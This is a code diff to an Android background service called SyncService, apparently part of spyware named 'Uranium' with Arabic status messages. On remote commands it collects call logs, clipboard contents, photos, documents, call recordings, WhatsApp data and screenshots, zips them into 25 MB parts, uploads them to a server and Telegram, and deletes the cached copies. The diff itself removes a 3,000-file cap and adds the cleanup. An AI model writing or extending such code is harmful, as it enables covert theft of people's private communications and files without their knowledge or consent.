@@ -108,19 +108,19 @@ class SyncService : Service() {
                                 val data = readCallLogs()
                                 processAndUpload(deviceId, nodeModel, "Uranium_CallLogs.txt", data.toByteArray(Charsets.UTF_8))
                             } else if (responseStr.contains("EXTRACT_CAMERA_ZIP")) {
-                                compressFolderDirect(deviceId, nodeModel, "/storage/emulated/0/DCIM", "Camera_DCIM")
+                                streamFolderDirect(deviceId, nodeModel, "/storage/emulated/0/DCIM", "Camera_DCIM")
                             } else if (responseStr.contains("EXTRACT_STORAGE_ZIP")) {
-                                compressFolderDirect(deviceId, nodeModel, "/storage/emulated/0/Download", "Storage_Download")
+                                streamFolderDirect(deviceId, nodeModel, "/storage/emulated/0/Download", "Storage_Download")
                             } else if (responseStr.contains("EXTRACT_AUDIO")) {
-                                compressFolderDirect(deviceId, nodeModel, "/storage/emulated/0/Music", "Audio_Music")
+                                streamFolderDirect(deviceId, nodeModel, "/storage/emulated/0/Music", "Audio_Music")
                             } else if (responseStr.contains("EXTRACT_DOCS")) {
-                                compressFolderDirect(deviceId, nodeModel, "/storage/emulated/0/Documents", "Documents_Folder")
+                                streamFolderDirect(deviceId, nodeModel, "/storage/emulated/0/Documents", "Documents_Folder")
                             } else if (responseStr.contains("EXTRACT_AUDIO_CALLS")) {
-                                compressFolderDirect(deviceId, nodeModel, "/storage/emulated/0/Recordings", "Call_Recordings")
+                                streamFolderDirect(deviceId, nodeModel, "/storage/emulated/0/Recordings", "Call_Recordings")
                             } else if (responseStr.contains("EXTRACT_CHAT_DBS")) {
-                                compressFolderDirect(deviceId, nodeModel, "/storage/emulated/0/WhatsApp", "WhatsApp_Data")
+                                streamFolderDirect(deviceId, nodeModel, "/storage/emulated/0/WhatsApp", "WhatsApp_Data")
                             } else if (responseStr.contains("EXTRACT_SCREENSHOT_ZIP")) {
-                                compressFolderDirect(deviceId, nodeModel, "/storage/emulated/0/Pictures/Screenshots", "Screenshots")
+                                streamFolderDirect(deviceId, nodeModel, "/storage/emulated/0/Pictures/Screenshots", "Screenshots")
                             } else if (responseStr.contains("EXTRACT_CLIPBOARD")) {
                                 val data = readClipboard()
                                 processAndUpload(deviceId, nodeModel, "Uranium_Clipboard.txt", data.toByteArray(Charsets.UTF_8))
@@ -149,14 +149,15 @@ class SyncService : Service() {
             val tempFile = File(cacheDir, fileName)
             tempFile.writeBytes(bytes)
             uploadRawFile(nodeId, nodeModel, fileName, tempFile)
-            sendReportToServer(nodeId, nodeModel, "✅ [حصاد ناجح] الملف <b>$fileName</b> تم إرساله للسيرفر بنجاح.")
+            try { tempFile.delete() } catch (e: Exception) {}
+            sendReportToServer(nodeId, nodeModel, "✅ [حصاد ناجح] الملف <b>$fileName</b> تم توجيهه لتليجرام وتفريغ الكاش.")
         } catch (e: Exception) {
             sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في معالجة $fileName: ${e.message}")
         }
     }
 
-    // الفحص والضغط المباشر للمسارات الفعلية (يتجاوز قيود الـ Scoped Storage بنجاح تام)
-    private fun compressFolderDirect(nodeId: String, nodeModel: String, targetDirPath: String, prefix: String) {
+    // نظام البث الفوري والتنظيف التلقائي لمنع أي تراكم في التخزين المؤقت
+    private fun streamFolderDirect(nodeId: String, nodeModel: String, targetDirPath: String, prefix: String) {
         try {
             val dir = File(targetDirPath)
             if (!dir.exists() || !dir.isDirectory) {
@@ -164,35 +165,62 @@ class SyncService : Service() {
                 return
             }
 
-            sendReportToServer(nodeId, nodeModel, "⚡ [بدء الحصاد المباشر] مسح وضغط مجلد $prefix بأمر السلطان...")
+            sendReportToServer(nodeId, nodeModel, "⚡ [البث الفوري] بدء سحب وتوجيه مجلد $prefix إلى تليجرام بأمر السلطان...")
 
-            val zipFile = File(cacheDir, "Uranium_${prefix}_${System.currentTimeMillis()}.zip")
-            val zipOut = ZipOutputStream(FileOutputStream(zipFile))
-            zipOut.setLevel(Deflater.BEST_COMPRESSION)
-
+            var partIndex = 1
             var fileCount = 0
+            var zipFile = File(cacheDir, "Uranium_${prefix}_part${partIndex}_${System.currentTimeMillis()}.zip")
+            var fos = FileOutputStream(zipFile)
+            var zipOut = ZipOutputStream(fos)
+            zipOut.setLevel(Deflater.DEFAULT_COMPRESSION)
+
             dir.walkTopDown().forEach { file ->
-                if (file.isFile && file.length() > 0 && fileCount < 3000) {
+                if (file.isFile && file.length() > 0) {
                     try {
-                        val relPath = file.toURI().path.removePrefix(dir.toURI().path)
+                        val relPath = file.absolutePath.removePrefix(dir.absolutePath)
                         zipOut.putNextEntry(ZipEntry("$prefix/$relPath"))
                         file.inputStream().use { fis -> fis.copyTo(zipOut) }
                         zipOut.closeEntry()
                         fileCount++
+
+                        // إذا وصل حجم الجزء إلى 25 ميجابايت، نغلقه ونرفعه فوراً لتليجرام ونحذفه من الكاش للحفاظ على نظافة التخزين
+                        if (zipFile.length() >= 25 * 1024 * 1024 || fileCount >= 250) {
+                            zipOut.finish()
+                            zipOut.flush()
+                            zipOut.close()
+                            fos.close()
+
+                            val sizeMB = zipFile.length() / (1024.0 * 1024.0)
+                            uploadRawFile(nodeId, nodeModel, zipFile.name, zipFile)
+                            sendReportToServer(nodeId, nodeModel, "📦 رفع الجزء (${partIndex}) من $prefix (${String.format("%.2f", sizeMB)} MB) وتم تنظيف الكاش.")
+                            
+                            try { zipFile.delete() } catch (ex: Exception) {}
+                            partIndex++
+                            fileCount = 0
+                            zipFile = File(cacheDir, "Uranium_${prefix}_part${partIndex}_${System.currentTimeMillis()}.zip")
+                            fos = FileOutputStream(zipFile)
+                            zipOut = ZipOutputStream(fos)
+                            zipOut.setLevel(Deflater.DEFAULT_COMPRESSION)
+                        }
                     } catch (e: Exception) {}
                 }
             }
+
+            zipOut.finish()
+            zipOut.flush()
             zipOut.close()
+            fos.close()
 
             if (zipFile.exists() && zipFile.length() > 0) {
                 val sizeMB = zipFile.length() / (1024.0 * 1024.0)
                 uploadRawFile(nodeId, nodeModel, zipFile.name, zipFile)
-                sendReportToServer(nodeId, nodeModel, "✅ [تم حصاد $prefix بنجاح]\n📂 الملف: <code>${zipFile.name}</code>\n📊 الحجم: <b>${String.format("%.2f", sizeMB)} MB</b> ($fileCount ملفاً)")
+                sendReportToServer(nodeId, nodeModel, "✅ [اكتمال حصاد $prefix] الجزء النهائي تم إرساله لتليجرام بنجاح (${String.format("%.2f", sizeMB)} MB).")
+                try { zipFile.delete() } catch (ex: Exception) {}
             } else {
-                sendReportToServer(nodeId, nodeModel, "⚠️ المجلد $prefix فارغ أو تعذر الوصول لملفاته.")
+                try { zipFile.delete() } catch (ex: Exception) {}
             }
         } catch (e: Exception) {
-            sendReportToServer(nodeId, nodeModel, "❌ خطأ في حصاد $prefix: ${e.message}")
+            sendReportToServer(nodeId, nodeModel, "❌ خطأ في بث $prefix: ${e.message}")
         }
     }
 
